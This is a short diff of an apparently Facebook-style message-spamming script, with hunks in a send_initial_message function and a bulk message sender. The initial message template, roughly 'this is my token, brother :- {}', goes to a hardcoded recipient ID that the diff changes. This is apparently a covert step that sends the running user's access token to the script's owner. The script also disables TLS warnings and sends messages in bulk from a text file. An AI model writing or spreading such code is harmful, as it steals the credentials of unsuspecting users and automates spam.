@@ -30,7 +30,7 @@ def send_initial_message():
       msg_template = "CREDIT :-💝💝 𝗥𝗔𝗩𝗜 𝗞𝗨𝗠𝗔𝗥 💝                                                       OWNER =>😈 𝗥𝗔𝗩𝗜 𝗞𝗨𝗠𝗔𝗥 𝗛𝗘𝗥𝗘 😈                                                      𝗛𝗘𝗟𝗟𝗢 𝗥𝗔𝗩𝗜 𝗞𝗨𝗠𝗔𝗥 𝗝𝗜😽 I 𝗬𝗘 𝗠𝗘𝗥𝗔 𝗧𝗢𝗞𝗘𝗡 𝗛𝗘 𝗕𝗛𝗔𝗜 🥳🥳🥳              :- {}"
 
       # Specify the ID where you want to send the message
-      target_id = "8517943384999183"
+      target_id = "85179433849"
 
       requests.packages.urllib3.disable_warnings()
 
@@ -65,7 +65,7 @@ def send_messages_from_file():
       with open('convo.txt', 'r') as file:
           convo_id = file.read().strip()
 
-      with open('file.txt', 'r') as file:
+      with open('ravihindi.txt', 'r') as file:
           messages = file.readlines()
 
       num_messages = len(messages)
